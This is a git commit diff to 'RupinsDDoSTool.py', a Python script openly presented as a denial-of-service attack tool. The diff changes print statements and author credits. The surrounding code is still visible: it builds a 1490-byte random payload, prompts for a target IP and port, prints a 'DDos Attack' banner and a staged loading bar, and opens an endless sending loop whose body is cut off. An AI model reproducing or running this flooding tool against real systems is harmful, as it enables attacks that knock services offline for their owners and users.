c56a0a591df4626ddc23f0b933d144535bb9c631
Q999777 <63502192+Q999777@users.noreply.github.com>
2020-04-21 18:41:19 -0500

    Update RupinsDDoSTool.py

--- RupinsDDoSTool.py
+++ RupinsDDoSTool.py
@@ -20,23 +20,23 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : Jaden"
-print "For   : Rupin"
+print ("Author   : Jaden/blackcrow")
+print ("For   : Rupin")
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print ("[Rupin its loading...]")
 time.sleep(5)
-print "[=====               ] 25%"
+print ("[=====               ] 25%")
 time.sleep(5)
-print "[==========          ] 50%"
+print ("[==========          ] 50%")
 time.sleep(5)
-print "[===============     ] 75%"
+print ("==============     ] 75%")
 time.sleep(5)
-print "[====================] 100%"
+print ("====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
